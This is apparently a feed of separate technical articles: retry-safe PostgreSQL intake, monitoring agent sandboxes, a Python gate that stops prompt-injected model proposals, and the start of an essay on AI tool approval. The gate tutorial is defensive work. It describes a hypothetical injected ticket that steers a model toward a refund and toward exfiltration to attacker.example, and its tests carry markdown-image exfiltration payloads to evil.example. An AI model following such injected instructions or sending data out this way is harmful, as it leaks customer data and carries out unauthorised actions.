items.title: Designing Retry-Safe Customer Intake with PostgreSQL
items.summary: Disclosure: This draft was generated with AI assistance for GILNEX editorial review. The SQL is an illustrative example, not a verified production implementation. References checked November 27, 2026. A customer taps Submit, the network times out, and the browser retries. Did the first request fail, or did the response disappear after the server committed? A reliable intake system must handle both possibilities without producing two appointments, two notifications, or two CRM records. Define the operation, not just the request A retry key identifies one intended operation. Generate it once for the submission and reuse it after a timeout. Scope it to the authenticated tenant and operation type. Derive the tenant on the server; never trust a tenant identifier supplied by a browser. Persist a normalized request fingerprint. If the same key arrives with a different payload, reject it as a conflict rather than silently accepting the changed request. A different key does not automatically mean the same customer; business-level duplicate detection is a separate concern. Make the database enforce uniqueness For a hypothetical PostgreSQL intake service, consider this minimal table: CREATE TABLE intake_requests ( tenant_id uuid NOT NULL , request_key uuid NOT NULL , payload_hash text NOT NULL , response_id uuid NOT NULL , PRIMARY KEY ( tenant_id , request_key ) ) ; Within one transaction, attempt an insert using ON CONFLICT (tenant_id, request_key) DO NOTHING RETURNING response_id . If a row is returned, this transaction owns the initial operation. Create the corresponding lead and an outbox record in the same transaction. If no row is returned, retrieve the committed record in a subsequent statement at READ COMMITTED, compare its fingerprint, and return the existing response identifier if the payload matches. At higher isolation levels, handle serialization failures with bounded transaction retries. Do not assume that an empty RETURNING result means the other transaction failed. Separate database commit from delivery Sending a notification before the transaction commits creates a failure window: a customer could receive confirmation for a record that never persisted. A transactional outbox makes the intent durable alongside the lead. A separate dispatcher claims outbox records, delivers them, and records the result. Delivery is still not magically exactly once. If the worker crashes after an external provider accepts a message but before the receipt is stored, the result is ambiguous. Use provider-supported idempotency where available, reconcile against provider receipts, and avoid blind retries when the effect is uncertain. Protect the booking invariant A request key cannot prevent two different customers from trying to reserve the same appointment. Enforce capacity separately, for example with a unique constraint for a single-capacity resource and time slot, or an atomic capacity reservation for a multi-capacity resource. Validate timezone, cancellation, rescheduling, and authorization rules independently. Test the failures you expect to see Run concurrent requests with the same key and payload; then repeat with different payloads. Simulate a lost HTTP response after commit, a crash before commit, a crash after external delivery, and two distinct keys competing for one slot. Test cross-tenant access and verify that logs omit sensitive customer payloads. Acceptance is observable: one durable lead for the repeated operation, no cross-tenant disclosure, a conflict for mismatched payload, no capacity violation, and a documented reconciliation path for uncertain delivery. The goal is not to claim perfect delivery. It is to make every ambiguous state visible, bounded and recoverable. References: PostgreSQL INSERT , Transaction isolation , DEV AI guidelines .

A customer taps Submit, the network times out, and the browser retries. Did the first request fail, or did the response disappear after the server committed? A reliable intake system must handle both possibilities without producing two appointments, two notifications, or two CRM records.

Define the operation, not just the request

A retry key identifies one intended operation. Generate it once for the submission and reuse it after a timeout. Scope it to the authenticated tenant and operation type. Derive the tenant on the server; never trust a tenant identifier supplied by a browser.

Persist a normalized request fingerprint. If the same key arrives with a different payload, reject it as a conflict rather than silently accepting the changed request. A different key does not automatically mean the same customer; business-level duplicate detection is a separate concern.

Make the database enforce uniqueness

For a hypothetical PostgreSQL intake service, consider this minimal table:

CREATE TABLE intake_requests (
  tenant_id uuid NOT NULL,
  request_key uuid NOT NULL,
  payload_hash text NOT NULL,
  response_id uuid NOT NULL,
  PRIMARY KEY (tenant_id, request_key)
);

Within one transaction, attempt an insert using ON CONFLICT (tenant_id, request_key) DO NOTHING RETURNING response_id. If a row is returned, this transaction owns the initial operation. Create the corresponding lead and an outbox record in the same transaction. If no row is returned, retrieve the committed record in a subsequent statement at READ COMMITTED, compare its fingerprint, and return the existing response identifier if the payload matches.

At higher isolation levels, handle serialization failures with bounded transaction retries. Do not assume that an empty RETURNING result means the other transaction failed.

Separate database commit from delivery

Sending a notification before the transaction commits creates a failure window: a customer could receive confirmation for a record that never persisted. A transactional outbox makes the intent durable alongside the lead. A separate dispatcher claims outbox records, delivers them, and records the result.

Delivery is still not magically exactly once. If the worker crashes after an external provider accepts a message but before the receipt is stored, the result is ambiguous. Use provider-supported idempotency where available, reconcile against provider receipts, and avoid blind retries when the effect is uncertain.

Protect the booking invariant

A request key cannot prevent two different customers from trying to reserve the same appointment. Enforce capacity separately, for example with a unique constraint for a single-capacity resource and time slot, or an atomic capacity reservation for a multi-capacity resource. Validate timezone, cancellation, rescheduling, and authorization rules independently.

Test the failures you expect to see

Run concurrent requests with the same key and payload; then repeat with different payloads. Simulate a lost HTTP response after commit, a crash before commit, a crash after external delivery, and two distinct keys competing for one slot. Test cross-tenant access and verify that logs omit sensitive customer payloads.

Acceptance is observable: one durable lead for the repeated operation, no cross-tenant disclosure, a conflict for mismatched payload, no capacity violation, and a documented reconciliation path for uncertain delivery.

The goal is not to claim perfect delivery. It is to make every ambiguous state visible, bounded and recoverable.

items.title: Watching what an agent's sandbox is doing: CPU, memory, disk and run history
items.summary: Short answer: four CLI commands answer most "what is my agent doing in there?" questions. sandscale sandbox list shows which sandboxes exist, sandscale sandbox metrics ID --follow shows CPU, memory and disk use as it happens, sandscale sandbox logs ID lists the commands that ran, and --run RUN_ID prints one command's output. For code, GET /api/v1/sandbox/runs/{id} returns a run's details and cost. Everything below is from the live sandscale sandbox reference , sandscale logs reference and sandboxes API guide . Which sandboxes are running? sandscale sandbox list sandscale sandbox show sbx_9 list takes --limit N and --cursor C for paging, and every command here takes --json for scripts. If your agents put labels on the sandboxes they start ( --label KEY=VALUE on sandscale sandbox start , or labels in the SDK), you can tie each one back to a task or pull request. A sandbox your agent forgot to stop still stops when its time limit runs out, but it counts against your plan's vCPU-hours until then. list is the quickest way to spot one. How hard is it working? sandscale sandbox metrics sbx_9 sandscale sandbox metrics sbx_9 --follow --interval 10s metrics prints the sandbox's CPU, memory and disk use. With --follow it prints new samples as they come, one JSON object per line with --json , which is easy to pipe into jq or a log shipper. What to look for: CPU pinned for a long time on a task that should be quick: a loop, or a test suite that hangs waiting for something it cannot reach. Memory climbing toward the box's size : the next command may come back with oom_killed . Each vCPU comes with 4 GiB; see sizing sandboxes . Disk filling : an agent writing logs or build output without cleaning up. See resource exhaustion in agent sandboxes . What did it run? sandscale sandbox logs sbx_9 sandscale sandbox logs sbx_9 --run run_3 The first lists the sandbox's runs; the second prints one run's output. sandscale logs sandbox ID [--run RUN_ID] is the same view under the top-level logs command, next to workspace and build host logs. This is useful after the fact: the agent's transcript tells you what it meant to do, and the run history tells you what actually executed. From code: the run record Every command run through the API is recorded. The exec answer includes a run_id ( runId in the TypeScript SDK), and: curl "https://api.sandscale.dev/api/v1/sandbox/runs/$RUN_ID" -H "Authorization: Bearer $SANDSCALE_API_KEY" returns that run's details and cost. Storing the run ID next to the agent step that caused it gives you a per-step cost without estimating. The exec answer itself already has exit_code , duration_ms , and timed_out and oom_killed flags. Live output while it runs For your own code rather than a terminal, the TypeScript SDK's run accepts onStdout and onStderr callbacks that receive output in order as the server releases it, and the result's streamed field says whether they got live output or the final output at the end. Streaming sandbox output in TypeScript covers the details. Who did what The CLI shows what a sandbox did. Who started it, stopped it and ran which commands is in your organization's hash-chained audit log, which every plan can read in the console and Team and Enterprise can export. Together they cover "what happened" and "who did it". More on how each Sandscale sandbox is isolated is on the product page. FAQ How do I see a Sandscale sandbox's CPU and memory use? Run sandscale sandbox metrics ID . Add --follow to keep printing new samples, --interval to change how often, and --json for one JSON object per line. How do I see what commands ran in a sandbox? sandscale sandbox logs ID lists the sandbox's runs, and sandscale sandbox logs ID --run RUN_ID prints one run's output. Can I get the cost of a single command? Yes. Every run through the API is recorded, and GET /api/v1/sandbox/runs/{id} with the run ID returns its details and cost. Do forgotten sandboxes keep running forever? No. A sandbox stops by itself when its time limit runs out. Until then it counts against your plan's vCPU-hours, so list your sandboxes and stop ones you no longer need. Related Timeouts for agent sandboxes Structured logging for agent runs Scripting the Sandscale CLI: exit codes and JSON Originally published on the Sandscale blog .

For code, GET /api/v1/sandbox/runs/{id} returns a run's details and cost.

Everything below is from the live sandscale sandbox reference, sandscale logs reference and sandboxes API guide.

Which sandboxes are running? 
sandscale sandbox list
sandscale sandbox show sbx_9

list takes --limit N and --cursor C for paging, and every command here takes --json for scripts. If your agents put labels on the sandboxes they start (--label KEY=VALUE on sandscale sandbox start, or labels in the SDK), you can tie each one back to a task or pull request.

sandscale sandbox metrics sbx_9 --follow --interval 10s

metrics prints the sandbox's CPU, memory and disk use. With --follow it prints new samples as they come, one JSON object per line with --json, which is easy to pipe into jq or a log shipper.

What to look for:

  • CPU pinned for a long time on a task that should be quick: a loop, or a test suite that hangs waiting for something it cannot reach.
  • Memory climbing toward the box's size: the next command may come back with oom_killed. Each vCPU comes with 4 GiB; see sizing sandboxes.
  • Disk filling: an agent writing logs or build output without cleaning up. See resource exhaustion in agent sandboxes.
What did it run?

sandscale sandbox logs sbx_9 --run run_3

The first lists the sandbox's runs; the second prints one run's output. sandscale logs sandbox ID [--run RUN_ID] is the same view under the top-level logs command, next to workspace and build host logs.

This is useful after the fact: the agent's transcript tells you what it meant to do, and the run history tells you what actually executed.

From code: the run record

Every command run through the API is recorded. The exec answer includes a run_id (runId in the TypeScript SDK), and:

curl "https://api.sandscale.dev/api/v1/sandbox/runs/$RUN_ID" -H "Authorization: Bearer $SANDSCALE_API_KEY"

Streaming sandbox output in TypeScript covers the details.

Who did what

The CLI shows what a sandbox did. Who started it, stopped it and ran which commands is in your organization's hash-chained audit log, which every plan can read in the console and Team and Enterprise can export. Together they cover "what happened" and "who did it". More on how each Sandscale sandbox is isolated is on the product page.

items.title: Let the model propose, let code decide: a tiny action gate for prompt-injection-prone AI workflows
items.summary: If your app feeds customer emails, tickets, web pages or files to an LLM and then does something with the output, you have a prompt-injection problem whether or not you've seen an attack yet. OWASP lists prompt injection as LLM01 in its 2025 Top 10 for LLM applications and says it is "unclear if there are fool-proof methods of prevention." The UK NCSC argued in December 2025 that it isn't analogous to SQL injection: there's no parameterised-query equivalent, because inside the model "there is only ever 'next token'." So this tutorial doesn't try to detect injections. It assumes the model will sometimes be fooled and makes sure that doesn't matter much. The principle comes from Beurer-Kellner et al. (2025), Design Patterns for Securing LLM Agents against Prompt Injections : once an LLM agent has ingested untrusted input, it must be constrained so that it is impossible for that input to trigger any consequential actions We'll build a ~100-line, standard-library Python action gate : The model never calls tools. It returns JSON proposals . Unknown actions are refused. Any proposal referencing a URL or email domain outside an allowlist is refused, including inside draft text (markdown images are a classic exfiltration channel; OWASP's Scenario #2 describes one). Consequential actions proposed after untrusted content was in context go to a human queue. Business limits are enforced in code no matter what the prompt said. The policy lives in code, not in the prompt ACTIONS = { # name: (consequential?, may_send_outside?) "draft_reply" : ( False , False ) , "add_internal_tag" : ( False , False ) , "summarize" : ( False , False ) , "issue_refund" : ( True , False ) , "change_email" : ( True , False ) , "send_email" : ( True , True ) , } ALLOWED_DOMAINS = { "callkarma.ai" } # example allowlist; use your own The full gate """ action_gate.py - a deterministic gate between an LLM's *proposed* actions and your real systems. The model never calls tools directly; it returns JSON proposals, and this code decides what runs, what waits for a human, and what is refused. Core rule (after Beurer-Kellner et al., 2025): once untrusted content is in the model's context, it must not be able to trigger a consequential action on its own. Here that means: consequential actions are queued for human approval, and anything that could send data outside an allowlist is refused outright. Standard library only. Python 3.9+. """ from __future__ import annotations import json import re from dataclasses import dataclass , field # Policy: what each action is allowed to do. Kept in code, not in the prompt. ACTIONS = { # name: (consequential?, may_send_outside?) "draft_reply" : ( False , False ) , # a draft for an agent to review "add_internal_tag" : ( False , False ) , "summarize" : ( False , False ) , "issue_refund" : ( True , False ) , "change_email" : ( True , False ) , "send_email" : ( True , True ) , } ALLOWED_DOMAINS = { "callkarma.ai" } # example allowlist for links/recipients MAX_REFUND_WITHOUT_REVIEW = 0 # every refund is reviewed in this example URL_RE = re . compile ( r "https?://([^/\s\"')]+)" , re . I ) EMAIL_RE = re . compile ( r "[\w.+-]+@([\w-]+\.[\w.-]+)" ) @dataclass class Decision : action : str verdict : str # "run" | "needs_human" | "refuse" reason : str args : dict = field ( default_factory = dict ) def _domains_in ( value ) -> set [ str ] : text = json . dumps ( value ) found = { m . group ( 1 ) . lower ( ) for m in URL_RE . finditer ( text ) } found |= { m . group ( 1 ) . lower ( ) for m in EMAIL_RE . finditer ( text ) } return found def _outside_allowlist ( domains : set [ str ] ) -> set [ str ] : return { d for d in domains if not any ( d == a or d . endswith ( "." + a ) for a in ALLOWED_DOMAINS ) } def gate ( proposal : dict , context_has_untrusted : bool ) -> Decision : """Decide what to do with ONE proposed action.""" name = proposal . get ( "action" ) args = proposal . get ( "args" , { } ) if name not in ACTIONS : return Decision ( str ( name ) , "refuse" , "unknown action (not on the allowlist)" , args ) consequential , may_send_outside = ACTIONS [ name ] # 1. Exfiltration channel check: links or recipients outside the allowlist. # Applies to every action, because even a draft can carry a tracking link. outside = _outside_allowlist ( _domains_in ( args ) ) if outside : return Decision ( name , "refuse" , f "references non-allowlisted domain(s): {sorted(outside)}" , args ) # 2. Consequential actions never run on model say-so when untrusted text is in context. if consequential and context_has_untrusted : return Decision ( name , "needs_human" , "consequential action proposed after reading untrusted content" , args ) # 3. Business limits enforced in code regardless of context. if name == "issue_refund" and float ( args . get ( "amount" , 0 ) ) > MAX_REFUND_WITHOUT_REVIEW : return Decision ( name , "needs_human" , "refund above no-review limit" , args ) if consequential : return Decision ( name , "needs_human" , "consequential action" , args ) return Decision ( name , "run" , "low-consequence, internal only" , args ) def gate_all ( model_output : str , context_has_untrusted : bool ) -> list [ Decision ] : try : proposals = json . loads ( model_output ) except json . JSONDecodeError : return [ Decision ( " " , "refuse" , "model output is not valid JSON" ) ] if not isinstance ( proposals , list ) : proposals = [ proposals ] return [ gate ( p , context_has_untrusted ) for p in proposals ] if __name__ == "__main__" : import sys data = json . load ( open ( sys . argv [ 1 ] if len ( sys . argv ) > 1 else "sample_proposals.json" ) ) for case in data : print ( f "\n== {case['name']} (untrusted in context: {case['untrusted']})" ) for d in gate_all ( json . dumps ( case [ "model_output" ] ) , case [ "untrusted" ] ) : print ( f " {d.verdict:12} {d.action:17} {d.reason}" ) A few details worth calling out: Subdomain matching is suffix-with-a-dot. docs.example.com matches example.com , but example.com.evil.example does not. Naive endswith("example.com") checks get this wrong. The domain scan runs on every action, including drafts. A draft that a human agent later sends, or a chat UI that auto-renders ![x](https://evil.example/p?d=...) , is an exit path. context_has_untrusted is set by your pipeline, not the model. If any customer-, web- or file-sourced text went into the prompt, it's True . Don't ask the model whether it saw an injection. Try it on sample proposals sample_proposals.json contains simulated model outputs (no LLM call needed). Case 2 is a hypothetical injected ticket whose hidden text pushed the model into proposing a refund, an outbound email and a tracking image: [ { "name" : "Normal ticket: customer asks about invoice date" , "untrusted" : true , "model_output" : [ { "action" : "summarize" , "args" : { "text" : "Customer asks about an invoice date." } } , { "action" : "draft_reply" , "args" : { "body" : "Thanks, I have passed your invoice question to our billing team. More: https://callkarma.ai/" } } ] } , { "name" : "HYPOTHETICAL injected ticket: hidden text asks for a refund and data forwarding" , "untrusted" : true , "model_output" : [ { "action" : "issue_refund" , "args" : { "order" : "A-1001" , "amount" : 480 } } , { "action" : "send_email" , "args" : { "to" : "billing-backup@attacker.example" , "body" : "Customer list attached" } } , { "action" : "draft_reply" , "args" : { "body" : "Done! See ![status](https://tracker.attacker.example/p?d=ACCOUNT_DATA)" } } ] } , { "name" : "Model invents a tool" , "untrusted" : true , "model_output" : [ { "action" : "delete_account" , "args" : { "id" : "C-77" } } ] } , { "name" : "Staff-initiated task, no external content" , "untrusted" : false , "model_output" : [ { "action" : "change_email" , "args" : { "customer" : "C-12" , "new_email" : " " } } ] } ] $ python3 action_gate.py == Normal ticket: customer asks about invoice date (untrusted in context: True) run summarize low-consequence, internal only run draft_reply low-consequence, internal only == HYPOTHETICAL injected ticket: hidden text asks for a refund and data forwarding (untrusted in context: True) needs_human issue_refund consequential action proposed after reading untrusted content refuse send_email references non-allowlisted domain(s): ['attacker.example'] refuse draft_reply references non-allowlisted domain(s): ['tracker.attacker.example'] == Model invents a tool (untrusted in context: True) refuse delete_account unknown action (not on the allowlist) == Staff-initiated task, no external content (untrusted in context: False) needs_human change_email consequential action The summary and draft for the normal ticket run. For the injected ticket the refund is held for a person, and both exfiltration attempts are refused, without the model having to notice anything . Tests import json , unittest from action_gate import gate , gate_all class T ( unittest . TestCase ) : def test_low_risk_runs ( self ) : self . assertEqual ( gate ( { "action" : "summarize" , "args" : { "text" : "hi" } } , True ) . verdict , "run" ) def test_refund_after_untrusted_needs_human ( self ) : self . assertEqual ( gate ( { "action" : "issue_refund" , "args" : { "amount" : 5 } } , True ) . verdict , "needs_human" ) def test_external_recipient_refused ( self ) : d = gate ( { "action" : "send_email" , "args" : { "to" : "x@evil.example" } } , False ) self . assertEqual ( d . verdict , "refuse" ) def test_markdown_image_exfil_refused ( self ) : d = gate ( { "action" : "draft_reply" , "args" : { "body" : "![a](https://evil.example/p?d=secret)" } } , True ) self . assertEqual ( d . verdict , "refuse" ) def test_subdomain_of_allowlisted_ok ( self ) : self . assertEqual ( gate ( { "action" : "draft_reply" , "args" : { "body" : "https://www.callkarma.ai/" } } , True ) . verdict , "run" ) def test_lookalike_domain_refused ( self ) : self . assertEqual ( gate ( { "action" : "draft_reply" , "args" : { "body" : "https://callkarma.ai.evil.example/" } } , True ) . verdict , "refuse" ) def test_unknown_action_refused ( self ) : self . assertEqual ( gate ( { "action" : "rm_rf" } , False ) . verdict , "refuse" ) def test_bad_json_refused ( self ) : self . assertEqual ( gate_all ( "not json" , True ) [ 0 ] . verdict , "refuse" ) def test_consequential_without_untrusted_still_reviewed ( self ) : self . assertEqual ( gate ( { "action" : "change_email" , "args" : { "new_email" : " " } } , False ) . verdict , "needs_human" ) if __name__ == "__main__" : unittest . main ( ) $ python3 test_action_gate.py ......... Ran 9 tests in 0.000s OK Wiring it to a real model Use your provider's structured-output / JSON mode, and validate against a schema before gate_all() . Set context_has_untrusted=True whenever retrieved or user-supplied content was included. Execute run decisions with credentials held by your app, not exposed to the model (OWASP mitigation #4). Put needs_human decisions in a review queue that shows the reason . The design-patterns paper warns that overloaded reviewers become a risk themselves, so keep that queue short by letting low-consequence actions through. Log every refuse . A spike is a useful signal even though you aren't relying on detection. Limits (read these) This gate stops injected text from triggering consequential actions and from leaking via allowlist-violating links/recipients . It doesn't stop the model from writing a misleading summary or a bad draft. Those still need normal review. Allowlisting by domain is coarse. Real systems need per-field rules (e.g. change_email should only accept an address verified through a separate flow). The URL/email regexes here are deliberately simple. Obfuscated or encoded data (OWASP Scenario #9, or non-printing characters) needs output normalisation, and ideally a strict output schema with no free-text fields that leave your system. Internal-only actions can still be abused (e.g. a message asking a colleague to approve something), so "internal" ≠ "safe." For a deeper treatment, read the paper's action-selector, plan-then-execute and dual-LLM patterns. This gate is a pragmatic first step towards them, not a replacement. References OWASP Gen AI Security Project, LLM01:2025 Prompt Injection : https://genai.owasp.org/llmrisk/llm01-prompt-injection/ UK NCSC, Prompt injection is not SQL injection (it may be worse) , Dec 2025: https://www.ncsc.gov.uk/blog-post/prompt-injection-is-not-sql-injection Simon Willison, The lethal trifecta for AI agents , Jun 16, 2025: https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/ Beurer-Kellner et al., Design Patterns for Securing LLM Agents against Prompt Injections , 2025: https://arxiv.org/abs/2506.08837 Written by the Call Karma team. We build AI for customer conversations at callkarma.ai .
items.summary_html:
If your app feeds customer emails, tickets, web pages or files to an LLM and then does something with the output, you have a prompt-injection problem whether or not you've seen an attack yet.

OWASP lists prompt injection as LLM01 in its 2025 Top 10 for LLM applications and says it is "unclear if there are fool-proof methods of prevention." The UK NCSC argued in December 2025 that it isn't analogous to SQL injection: there's no parameterised-query equivalent, because inside the model "there is only ever 'next token'."

So this tutorial doesn't try to detect injections. It assumes the model will sometimes be fooled and makes sure that doesn't matter much. The principle comes from Beurer-Kellner et al. (2025), Design Patterns for Securing LLM Agents against Prompt Injections:

once an LLM agent has ingested untrusted input, it must be constrained so that it is impossible for that input to trigger any consequential actions

We'll build a ~100-line, standard-library Python action gate:

  1. The model never calls tools. It returns JSON proposals.
  2. Unknown actions are refused.
  3. Any proposal referencing a URL or email domain outside an allowlist is refused, including inside draft text (markdown images are a classic exfiltration channel; OWASP's Scenario #2 describes one).
  4. Consequential actions proposed after untrusted content was in context go to a human queue.
  5. Business limits are enforced in code no matter what the prompt said.
The policy lives in code, not in the prompt 
ACTIONS = {
    # name:             (consequential?, may_send_outside?)
    "draft_reply":      (False, False),
    "add_internal_tag": (False, False),
    "summarize":        (False, False),
    "issue_refund":     (True,  False),
    "change_email":     (True,  False),
    "send_email":       (True,  True),
}
ALLOWED_DOMAINS = {"callkarma.ai"}   # example allowlist; use your own
The full gate 
"""
action_gate.py - a deterministic gate between an LLM's *proposed* actions and
your real systems. The model never calls tools directly; it returns JSON
proposals, and this code decides what runs, what waits for a human, and what
is refused.

Core rule (after Beurer-Kellner et al., 2025): once untrusted content is in the
model's context, it must not be able to trigger a consequential action on its
own. Here that means: consequential actions are queued for human approval, and
anything that could send data outside an allowlist is refused outright.

Standard library only. Python 3.9+.
"""
from __future__ import annotations

import json
import re
from dataclasses import dataclass, field

# Policy: what each action is allowed to do. Kept in code, not in the prompt.
ACTIONS = {
    # name:            (consequential?, may_send_outside?)
    "draft_reply":     (False, False),   # a draft for an agent to review
    "add_internal_tag": (False, False),
    "summarize":       (False, False),
    "issue_refund":    (True,  False),
    "change_email":    (True,  False),
    "send_email":      (True,  True),
}

ALLOWED_DOMAINS = {"callkarma.ai"}          # example allowlist for links/recipients
MAX_REFUND_WITHOUT_REVIEW = 0               # every refund is reviewed in this example

URL_RE = re.compile(r"https?://([^/\s\"')]+)", re.I)
EMAIL_RE = re.compile(r"[\w.+-]+@([\w-]+\.[\w.-]+)")


@dataclass
class Decision:
    action: str
    verdict: str            # "run" | "needs_human" | "refuse"
    reason: str
    args: dict = field(default_factory=dict)


def _domains_in(value) -> set[str]:
    text = json.dumps(value)
    found = {m.group(1).lower() for m in URL_RE.finditer(text)}
    found |= {m.group(1).lower() for m in EMAIL_RE.finditer(text)}
    return found


def _outside_allowlist(domains: set[str]) -> set[str]:
    return {d for d in domains
            if not any(d == a or d.endswith("." + a) for a in ALLOWED_DOMAINS)}


def gate(proposal: dict, context_has_untrusted: bool) -> Decision:
    """Decide what to do with ONE proposed action."""
    name = proposal.get("action")
    args = proposal.get("args", {})
    if name not in ACTIONS:
        return Decision(str(name), "refuse", "unknown action (not on the allowlist)", args)

    consequential, may_send_outside = ACTIONS[name]

    # 1. Exfiltration channel check: links or recipients outside the allowlist.
    #    Applies to every action, because even a draft can carry a tracking link.
    outside = _outside_allowlist(_domains_in(args))
    if outside:
        return Decision(name, "refuse", f"references non-allowlisted domain(s): {sorted(outside)}", args)

    # 2. Consequential actions never run on model say-so when untrusted text is in context.
    if consequential and context_has_untrusted:
        return Decision(name, "needs_human", "consequential action proposed after reading untrusted content", args)

    # 3. Business limits enforced in code regardless of context.
    if name == "issue_refund" and float(args.get("amount", 0)) > MAX_REFUND_WITHOUT_REVIEW:
        return Decision(name, "needs_human", "refund above no-review limit", args)

    if consequential:
        return Decision(name, "needs_human", "consequential action", args)
    return Decision(name, "run", "low-consequence, internal only", args)


def gate_all(model_output: str, context_has_untrusted: bool) -> list[Decision]:
    try:
        proposals = json.loads(model_output)
    except json.JSONDecodeError:
        return [Decision("", "refuse", "model output is not valid JSON")]
    if not isinstance(proposals, list):
        proposals = [proposals]
    return [gate(p, context_has_untrusted) for p in proposals]


if __name__ == "__main__":
    import sys
    data = json.load(open(sys.argv[1] if len(sys.argv) > 1 else "sample_proposals.json"))
    for case in data:
        print(f"\n== {case['name']} (untrusted in context: {case['untrusted']})")
        for d in gate_all(json.dumps(case["model_output"]), case["untrusted"]):
            print(f"  {d.verdict:12} {d.action:17} {d.reason}")

A few details worth calling out:

  • Subdomain matching is suffix-with-a-dot. docs.example.com matches example.com, but example.com.evil.example does not. Naive endswith("example.com") checks get this wrong.
  • The domain scan runs on every action, including drafts. A draft that a human agent later sends, or a chat UI that auto-renders ![x](https://evil.example/p?d=...), is an exit path.
  • context_has_untrusted is set by your pipeline, not the model. If any customer-, web- or file-sourced text went into the prompt, it's True. Don't ask the model whether it saw an injection.
Try it on sample proposals

sample_proposals.json contains simulated model outputs (no LLM call needed). Case 2 is a hypothetical injected ticket whose hidden text pushed the model into proposing a refund, an outbound email and a tracking image:

[
  {"name": "Normal ticket: customer asks about invoice date",
   "untrusted": true,
   "model_output": [
     {"action": "summarize", "args": {"text": "Customer asks about an invoice date."}},
     {"action": "draft_reply", "args": {"body": "Thanks, I have passed your invoice question to our billing team. More: https://callkarma.ai/"}}
   ]},
  {"name": "HYPOTHETICAL injected ticket: hidden text asks for a refund and data forwarding",
   "untrusted": true,
   "model_output": [
     {"action": "issue_refund", "args": {"order": "A-1001", "amount": 480}},
     {"action": "send_email", "args": {"to": "billing-backup@attacker.example", "body": "Customer list attached"}},
     {"action": "draft_reply", "args": {"body": "Done! See ![status](https://tracker.attacker.example/p?d=ACCOUNT_DATA)"}}
   ]},
  {"name": "Model invents a tool",
   "untrusted": true,
   "model_output": [{"action": "delete_account", "args": {"id": "C-77"}}]},
  {"name": "Staff-initiated task, no external content",
   "untrusted": false,
   "model_output": [{"action": "change_email", "args": {"customer": "C-12", "new_email": ""}}]}
]

$ python3 action_gate.py

== Normal ticket: customer asks about invoice date (untrusted in context: True)
  run          summarize         low-consequence, internal only
  run          draft_reply       low-consequence, internal only

== HYPOTHETICAL injected ticket: hidden text asks for a refund and data forwarding (untrusted in context: True)
  needs_human  issue_refund      consequential action proposed after reading untrusted content
  refuse       send_email        references non-allowlisted domain(s): ['attacker.example']
  refuse       draft_reply       references non-allowlisted domain(s): ['tracker.attacker.example']

== Model invents a tool (untrusted in context: True)
  refuse       delete_account    unknown action (not on the allowlist)

== Staff-initiated task, no external content (untrusted in context: False)
  needs_human  change_email      consequential action

The summary and draft for the normal ticket run. For the injected ticket the refund is held for a person, and both exfiltration attempts are refused, without the model having to notice anything.

Tests 
import json, unittest
from action_gate import gate, gate_all

class T(unittest.TestCase):
    def test_low_risk_runs(self):
        self.assertEqual(gate({"action": "summarize", "args": {"text": "hi"}}, True).verdict, "run")
    def test_refund_after_untrusted_needs_human(self):
        self.assertEqual(gate({"action": "issue_refund", "args": {"amount": 5}}, True).verdict, "needs_human")
    def test_external_recipient_refused(self):
        d = gate({"action": "send_email", "args": {"to": "x@evil.example"}}, False)
        self.assertEqual(d.verdict, "refuse")
    def test_markdown_image_exfil_refused(self):
        d = gate({"action": "draft_reply", "args": {"body": "![a](https://evil.example/p?d=secret)"}}, True)
        self.assertEqual(d.verdict, "refuse")
    def test_subdomain_of_allowlisted_ok(self):
        self.assertEqual(gate({"action": "draft_reply", "args": {"body": "https://www.callkarma.ai/"}}, True).verdict, "run")
    def test_lookalike_domain_refused(self):
        self.assertEqual(gate({"action": "draft_reply", "args": {"body": "https://callkarma.ai.evil.example/"}}, True).verdict, "refuse")
    def test_unknown_action_refused(self):
        self.assertEqual(gate({"action": "rm_rf"}, False).verdict, "refuse")
    def test_bad_json_refused(self):
        self.assertEqual(gate_all("not json", True)[0].verdict, "refuse")
    def test_consequential_without_untrusted_still_reviewed(self):
        self.assertEqual(gate({"action": "change_email", "args": {"new_email": ""}}, False).verdict, "needs_human")

if __name__ == "__main__":
    unittest.main()

$ python3 test_action_gate.py
.........
Ran 9 tests in 0.000s
OK
Wiring it to a real model
  1. Use your provider's structured-output / JSON mode, and validate against a schema before gate_all().
  2. Set context_has_untrusted=True whenever retrieved or user-supplied content was included.
  3. Execute run decisions with credentials held by your app, not exposed to the model (OWASP mitigation #4).
  4. Put needs_human decisions in a review queue that shows the reason. The design-patterns paper warns that overloaded reviewers become a risk themselves, so keep that queue short by letting low-consequence actions through.
  5. Log every refuse. A spike is a useful signal even though you aren't relying on detection.
Limits (read these)
  • This gate stops injected text from triggering consequential actions and from leaking via allowlist-violating links/recipients. It doesn't stop the model from writing a misleading summary or a bad draft. Those still need normal review.
  • Allowlisting by domain is coarse. Real systems need per-field rules (e.g. change_email should only accept an address verified through a separate flow).
  • The URL/email regexes here are deliberately simple. Obfuscated or encoded data (OWASP Scenario #9, or non-printing characters) needs output normalisation, and ideally a strict output schema with no free-text fields that leave your system.
  • Internal-only actions can still be abused (e.g. a message asking a colleague to approve something), so "internal" ≠ "safe."

For a deeper treatment, read the paper's action-selector, plan-then-execute and dual-LLM patterns. This gate is a pragmatic first step towards them, not a replacement.

References
  • OWASP Gen AI Security Project, LLM01:2025 Prompt Injection: https://genai.owasp.org/llmrisk/llm01-prompt-injection/
  • UK NCSC, Prompt injection is not SQL injection (it may be worse), Dec 2025: https://www.ncsc.gov.uk/blog-post/prompt-injection-is-not-sql-injection
  • Simon Willison, The lethal trifecta for AI agents, Jun 16, 2025: https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/
  • Beurer-Kellner et al., Design Patterns for Securing LLM Agents against Prompt Injections, 2025: https://arxiv.org/abs/2506.08837

This article was originally published on Medium.

Nobody said no. Then a spreadsheet arrived.

You found an AI tool that would genuinely help your team. You mentioned it to your manager. The reaction was not hostile — a nod, maybe a "sounds interesting." You wrote up a short proposal and sent it off, expecting a decision within a week or two.

Instead, a spreadsheet arrived. Dozens of rows: data handling, storage locations, subcontractors, certifications, contract terms. You answered what you could. Then — silence. Not a rejection. Just weeks of nothing, while your proposal sat somewhere you couldn't see.

It is approved when a set of questions — asked by IT, security, legal, and accounting, each protecting something different — have all been answered to someone's satisfaction.

This article names those questions in advance, so you can prepare for them before the spreadsheet arrives.

The questionnaire is not paperwork after the decision. It is the decision.

Foreign employees often treat the security questionnaire as bureaucracy: the real decision happens in a meeting, and the form is filled in afterward. A proposal that arrives without them reads as homework for everyone else, and it waits.

